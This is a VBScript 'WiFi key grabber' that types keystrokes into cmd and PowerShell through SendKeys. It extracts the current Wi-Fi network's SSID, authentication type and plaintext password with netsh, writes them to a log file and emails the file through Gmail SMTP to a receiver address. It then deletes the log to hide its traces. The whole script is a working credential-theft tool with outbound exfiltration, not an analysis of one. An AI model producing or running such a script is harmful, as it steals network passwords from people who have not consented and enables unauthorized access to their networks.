set wshshell = wscript.createobject("wscript.shell")
set objshell = createobject("shell.application")
objShell.FileRun
WScript.Sleep 500
WshShell.SendKeys(" cmd")
WshShell.SendKeys("{ENTER}")
WScript.Sleep 1000

' --> Getting SSID
WshShell.SendKeys(" cd ""{%}USERPROFILE{%}\Desktop"" & for /f ""tokens=2 delims=: "" {%}A in {(}{'}netsh wlan show interface {^}{|} findstr ""SSID"" {^}{|} findstr /v ""BSSID""{'}{)} do set A={%}A")
WshShell.SendKeys("{ENTER}")

' --> Creating A.txt
WshShell.SendKeys(" netsh wlan show profiles {%}A{%} key=clear {|} findstr /c:""Network type"" /c:""Authentication"" /c:""Key Content"" {|} findstr /v ""broadcast"" {|} findstr /v ""Radio"">>A.txt")
WshShell.SendKeys("{ENTER}")

' --> Get network type
WshShell.SendKeys(" for /f ""tokens=3 delims=: "" {%}A in {(}{'}findstr ""Network type"" A.txt{'}{)} do set B={%}A")
WshShell.SendKeys("{ENTER}")

' --> Get authentication
WshShell.SendKeys(" for /f ""tokens=2 delims=: "" {%}A in {(}{'}findstr ""Authentication"" A.txt{'}{)} do set C={%}A")
WshShell.SendKeys("{ENTER}")

' --> Get password
WshShell.SendKeys(" for /f ""tokens=3 delims=: "" {%}A in {(}{'}findstr ""Key Content"" A.txt{'}{)} do set D={%}A")
WshShell.SendKeys("{ENTER}")

' --> Delete A.txt
WshShell.SendKeys(" del A.txt")
WshShell.SendKeys("{ENTER}")

' --> Create Log.txt
WshShell.SendKeys(" echo SSID: {%}A{%}>>Log.txt & echo Network type: {%}B{%}>>Log.txt & echo Authentication: {%}C{%}>>Log.txt & echo Password: {%}D{%}>>Log.txt")
WshShell.SendKeys("{ENTER}")

' --> Mail Log.txt
WshShell.SendKeys(" powershell")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $SMTPServer = {'}smtp.gmail.com{'}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $SMTPInfo = New-Object Net.Mail.SmtpClient{(}$SmtpServer, 587{)}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $SMTPInfo.EnableSsl = $true")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential{(}{'}ACCOUNT@gmail.com{'}, {'}PASSWORD{'}{)}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $ReportEmail = New-Object System.Net.Mail.MailMessage")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $ReportEmail.From = {'}ACCOUNT@gmail.com{'}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $ReportEmail.To.Add{(}{'}RECEIVER@gmail.com{'}{)}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $ReportEmail.Subject = {'}WiFi key grabber{'}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $ReportEmail.Body = {(}Get-Content Log.txt {|} out-string{)}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" $SMTPInfo.Send{(}$ReportEmail{)}")
WshShell.SendKeys("{ENTER}")
WshShell.SendKeys(" exit")
WshShell.SendKeys("{ENTER}")
WScript.Sleep 2000
' --> Delete Log.txt and exit
WshShell.SendKeys(" del Log.txt & exit")
WScript.Sleep 1000
WshShell.SendKeys("{ENTER}")
